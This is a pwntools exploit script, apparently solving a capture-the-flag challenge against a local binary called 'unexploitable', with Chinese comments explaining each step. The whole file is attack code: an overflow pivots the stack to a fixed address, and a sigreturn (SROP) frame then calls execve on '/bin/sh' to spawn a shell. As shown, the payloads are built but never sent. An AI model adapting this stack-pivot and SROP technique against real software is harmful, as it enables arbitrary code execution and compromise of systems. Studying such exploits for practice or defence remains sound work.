#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x400560
set_read_addr = 0x40055b
read_addr = 0x400571
fake_stack_addr = 0x60116c
fake_ebp_addr = 0x60116c
binsh_addr = 0x60115c

io = process("./unexploitable")

payload1 = ""
payload1 += 'a'*16               #padding
payload1 += p64(fake_stack_addr) #两次leave造成的stack pivot，第一次使rbp变为0x60116c, rbp+buf为0x60115c
payload1 += p64(set_read_addr)   #lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read


frameExecve = SigreturnFrame()              #设置SROP Frame
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_addr
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

payload2 = ""
payload2 += "/bin/sh\x00"                #\bin\sh，在0x60115c
payload2 += 'a'*8                        #padding
payload2 += p64(fake_stack_addr+0x10)    #在0x60116c，leave指令之后rsp指向此处+8，+0x18之后指向syscall所在栈地址
payload2 += p64(read_addr)               #在0x601174，rsi, rdi, rdx不变，调用read，用下面的set rax输入15个字符设置rax = 15
payload2 += p64(fake_ebp_addr)           #call read下一行是leave, rsp再次被换成fake_stack_addr+0x10+8, 即0x60117c+8。随便设置了一个可读写地址
payload2 += p64(syscall_addr)            #在0x60117c+8，即0x601184，调用syscall。上一步的call read读取了15个字符，所以rax=0xf，这个syscall将会触发sys_sigreturn，触发SROP
payload2 += str(frameExecve)             #SigreturnFrame
